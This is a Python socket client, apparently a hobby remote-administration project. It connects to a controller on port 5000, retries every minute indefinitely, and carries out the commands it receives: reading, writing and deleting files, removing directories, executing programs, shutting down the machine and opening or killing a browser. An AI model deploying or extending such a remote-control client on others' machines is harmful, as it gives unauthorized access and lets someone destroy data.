import socket
import os
import subprocess
import sys
import time #Using time module to retry connection every 1 minute.

def client():

    #Creating the socket passing the ip and port as parameters and trying to connect
    host = "127.0.0.1"
    port = 5000
    mySocket = socket.socket()
    mySocket.connect((host,port))

    #Initialize the message so the while loop can be accessed
    receiving_message =""
    #If the message is quit just do it quit..
    while receiving_message!= 'quit':
        #Receiving a message as byte stream and decode() it in string
        receiving_message = mySocket.recv(4096).decode()
        print(receiving_message) #just to see if the message went through as intended
        #Working with files and folders using the os module
        if receiving_message =='getcwd':
            getCurrentWorkingDirectory(mySocket)
        elif receiving_message[0:5] =='chdir':
            changeDirectory(mySocket,receiving_message)
        elif receiving_message == "listdir":
            listOfFilesAndFolders(mySocket)
        #You need to provide the whole path no made what is your current working directory
        elif receiving_message[0:10] == "removedirs":
            removeDirectories(mySocket,receiving_message)    
        elif receiving_message[0:6] =='remove':
            deleteFile(mySocket,receiving_message)
        #Making new directories note that the directory starts from your current working directory not from /home or C:
        elif receiving_message[0:8] == 'makedirs':
            makeDirectories(mySocket,receiving_message)
        elif receiving_message[0:6] == 'create':
            createFile(mySocket,receiving_message)
        elif receiving_message[0:7] == 'execute':
            executeFile(mySocket,receiving_message)
        elif receiving_message[0:4] == 'read':
            readFile(mySocket,receiving_message)
        elif receiving_message[0:5] == 'write':
            writeToFile(mySocket,receiving_message)
        elif receiving_message[0:8] == 'shutdown':
            shutdown(mySocket,receiving_message)
        elif receiving_message[0:7] == 'browser':
            openURL(mySocket,receiving_message)
        elif receiving_message == 'kill_browser':
            killTheBrowser(mySocket)
        elif receiving_message == 'welcome':
            sending_message = 'Client is connected and waiting for commands, type help for more info.'
            mySocket.send(sending_message.encode())  
        else:
            sending_message = "Sorry i couldn't execute"
            mySocket.send(sending_message.encode())
            
    #Close the socket when the message is quit
    mySocket.close()


def getCurrentWorkingDirectory(mySocket):
    sending_message = os.getcwd()
    mySocket.send(sending_message.encode())

def changeDirectory(mySocket,receiving_message):
    try:
        os.chdir(receiving_message[6:])
        sending_message = os.getcwd()
    #os.chdir() throws a FileNotFound error, we catch it here so our code can continue to run   
    except FileNotFoundError:
        sending_message = 'Error folder not found'
    finally:
        mySocket.send(sending_message.encode())

def deleteFile(mySocket,receiving_message):
     try:
        os.remove(receiving_message[7:])
        sending_message = 'File deleted'
        #os.remove() throws a FileNotFound error, we catch it here so our code can continue to run   
     except FileNotFoundError:
        sending_message = 'Error file not found'
     finally:
        mySocket.send( sending_message.encode())

def makeDirectories(mySocket,receiving_message):
    try:
        os.makedirs(receiving_message[9:])
        sending_message = str(os.getcwd()+receiving_message[8:])
    except:
        sending_message = 'Something went wrong maybe you need permission.'
    finally:
        mySocket.send( sending_message.encode())

def removeDirectories(mySocket,receiving_message):
    try:
        os.removedirs(receiving_message[11:])
        sending_message = 'Directory  deleted.'
    except:
        sending_message = 'Something went wrong maybe you need permission.'
    finally:
        mySocket.send( sending_message.encode())
        
def createFile(mySocket,receiving_message):
    try:
        file = os.open(receiving_message[7:],os.O_CREAT)
        os.close(file)
        sending_message = 'File created.'
    except:
        sending_message = 'Something went wrong sorry.'
    finally:
        mySocket.send( sending_message.encode())  

def readFile(mySocket,receiving_message):
    try:
        file = os.open(receiving_message[5:],os.O_RDWR)
        sending_message = os.read(file,4096)
        os.close(file)
    except:
        sending_message = "Error something went wrong.".encode()
    finally:
        mySocket.send(sending_message)

       
def writeToFile(mySocket,filename):
    #Build a text message until close is send
    try:
        sending_message = "Start your message.".encode()
        mySocket.send(sending_message)
        receiving_message = mySocket.recv(4096).decode()
        print(receiving_message)
        text = receiving_message
        while receiving_message!="close":
            mySocket.send(text.encode())
            receiving_message = mySocket.recv(4096).decode()
            text += "\n"+ receiving_message
    #Open the file write the message and close() at the end
        else:
            file = os.open(filename[6:],os.O_RDWR)
            os.write(file,text.encode())
            os.close(file)
            mySocket.send("Message written succesfully.".encode())
    
    except:
        mySocket.send("Something went wrong.".encode())
        os.close(file)


def shutdown(mySocket,receiving_message):
    try:
        
        if sys.platform == "win32":
            if receiving_message[9:] == "-r":
                os.system("shutdown -r")
                sending_message = "The computer will restart in 1 min."
            elif  receiving_message[9:] == "-s":
                os.system("shutdown -s")
                sending_message = "The computer will shutdown in 1 min."
            else:
                sending_message = "Wrong option use -r or -s"
        else:
            if receiving_message[9:] == "-r":
                os.system("reboot")
                sending_message = "The computer will restart."
            elif  receiving_message[9:] == "-s":
                os.system("shutdown")
                sending_message = "The computer will shutdown."
            else:
                sending_message = "Wrong option use -r or -s"
    except:
        sending_message = "Error something went wrong"
    mySocket.send(sending_message.encode())
    
def listOfFilesAndFolders(mySocket):
    sending_message = os.listdir(os.getcwd())
    mySocket.send((str(sending_message)).encode())


#check if the os is windows or linux and execute accordingly
#in linux you can run only python scripts while in windows you can run pretty much any program
def executeFile(mySocket,receiving_message):
    try:
        if sys.platform == "win32":
            os.startfile(receiving_message[8:])
        else:
            output = subprocess.call(["python", receiving_message[8:]])
            if output == 0:
                sending_message = "File execute successfully."
            else:
                sending_message = "Could not execute."
    except:
        sending_message = "Error something went wrong"
    finally:
        mySocket.send(sending_message.encode())



    
# note that this works on windows only   
def openURL(mySocket,receiving_message):
    # open given url in google chrome broswer, using subprocess module
    # first pass browser location and then the url you want to open
    p = subprocess.Popen(['C:\Program Files (x86)\Google\Chrome\Application\chrome.exe',receiving_message[9:] ])
    sending_message = "broswer opened"
    mySocket.send(sending_message.encode())

# note that this works on windows only   
def killTheBrowser(mySocket):
    #killing the open browser
    os.system("taskkill /f /im "+ "chrome.exe")
    sending_message = "broswer killed"
    mySocket.send(sending_message.encode())




if __name__ == "__main__":
   while True:
       try:
            client()
       except:
            print("could not connect")
            time.sleep(60) # sleep for 60 seconds before retrying to connect


    
